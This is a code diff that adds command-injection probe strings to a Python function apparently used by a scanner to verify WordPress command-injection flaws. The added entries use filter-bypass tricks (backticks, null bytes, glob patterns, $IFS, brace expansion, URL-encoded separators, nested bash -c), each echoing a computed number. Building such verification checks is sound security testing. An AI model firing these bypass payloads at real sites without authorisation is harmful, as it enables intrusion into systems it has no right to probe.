@@ -5753,6 +5753,22 @@ def verify_wordpress_command_injection(
             # el valor entero como comando (si el parametro ES el comando completo, no un
             # argumento que se concatena a otro)
             f"echo {calc}", calc,
+            # Backtick inside double-quoted string — when value is wrapped in "..."
+            f'";`echo {calc}`;echo "',
+            # Null byte termination (some langs stop string at \x00, rest goes to shell)
+            f"\x00; echo {calc}",
+            # Wildcard / glob expansion bypass: some filters allow * but not ;
+            f";e*ho {calc}",
+            # Env var expansion: $IFS as space substitute
+            f"$(echo${{IFS}}{calc})",
+            # Curly-brace expansion in bash: {echo,{a+b}} = "echo <sum>"
+            f"{{echo,{a}}}",  # simpler: just echo one number to check echo works
+            # URL-encoded ; and spaces for layers that decode before shell
+            f"%3becho%20{calc}",
+            f"%7cecho%20{calc}",  # | url-encoded
+            # Double shell injection: bash -c 'echo ...'
+            f"; bash -c 'echo {calc}'",
+            f"| bash -c 'echo {calc}'",
         ]
         m = (http_method or "GET").upper()
         base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
